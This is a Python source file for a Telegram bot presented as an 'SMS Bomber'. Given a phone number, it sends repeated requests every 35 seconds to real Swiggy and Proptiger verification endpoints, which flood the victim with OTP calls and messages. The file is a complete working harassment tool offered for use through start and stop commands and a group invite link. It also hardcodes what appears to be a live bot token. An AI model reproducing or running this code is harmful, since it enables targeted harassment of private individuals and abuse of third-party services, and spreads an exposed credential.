import requests
import asyncio
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

BOT_TOKEN = "8181468891:AAEVsNSBv-PC9klp0YqC7ZXpge8Qq_wRpwQ"
TELEGRAM_GROUP = "https://t.me/+DDVmus7_7u44YjQ1"

SMS_APIS = [
    {
        "name": "Swiggy",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "data": {"mobile": "PHONE_NUMBER"},
        "headers": {"Content-Type": "application/json"},
        "method": "POST"
    },
    {
        "name": "Proptiger",
        "url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
        "data": {"contactNumber": "PHONE_NUMBER", "domainId": "2"},
        "headers": {"Content-Type": "application/json"},
        "method": "POST"
    }
]

# Store active bombing tasks
active_bombs = {}

async def start(update, context):
    keyboard = [
        [InlineKeyboardButton("Join Group", url=TELEGRAM_GROUP)]
    ]
    await update.message.reply_text(
        "SMS Bomber Bot\n\n"
        "/bomb [number] - Start bombing\n"
        "/stop - Stop bombing",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def bomb(update, context):
    if not context.args or not context.args[0].isdigit() or len(context.args[0]) != 10:
        await update.message.reply_text("Invalid format. Use: /bomb 9876543210")
        return

    phone = context.args[0]
    user_id = update.effective_user.id

    # Stop any existing bombing for this user
    if user_id in active_bombs:
        active_bombs[user_id].cancel()
    
    # Create new bombing task
    task = asyncio.create_task(continuous_bomb(update, context, phone))
    active_bombs[user_id] = task
    
    await update.message.reply_text(f"🚀 Started bombing {phone} every 35 seconds")

async def continuous_bomb(update, context, phone):
    count = 0
    while True:
        try:
            for api in SMS_APIS:
                data = {k: v.replace("PHONE_NUMBER", phone) if isinstance(v, str) else v 
                       for k, v in api["data"].items()}
                
                if api["method"] == "POST":
                    requests.post(api["url"], json=data, headers=api["headers"], timeout=5)
                else:
                    requests.get(api["url"], params=data, headers=api["headers"], timeout=5)
            
            count += 1
            await update.message.reply_text(f"📤 Sent {count} batches to {phone}")
            await asyncio.sleep(35)  # Wait 35 seconds between batches
            
        except asyncio.CancelledError:
            await update.message.reply_text("🛑 Bombing stopped")
            break
        except Exception as e:
            await update.message.reply_text(f"⚠️ Error: {str(e)}")
            await asyncio.sleep(35)

async def stop(update, context):
    user_id = update.effective_user.id
    if user_id in active_bombs:
        active_bombs[user_id].cancel()
        del active_bombs[user_id]
        await update.message.reply_text("✅ Stopped bombing")
    else:
        await update.message.reply_text("❌ No active bombing to stop")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb))
    app.add_handler(CommandHandler("stop", stop))
    
    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
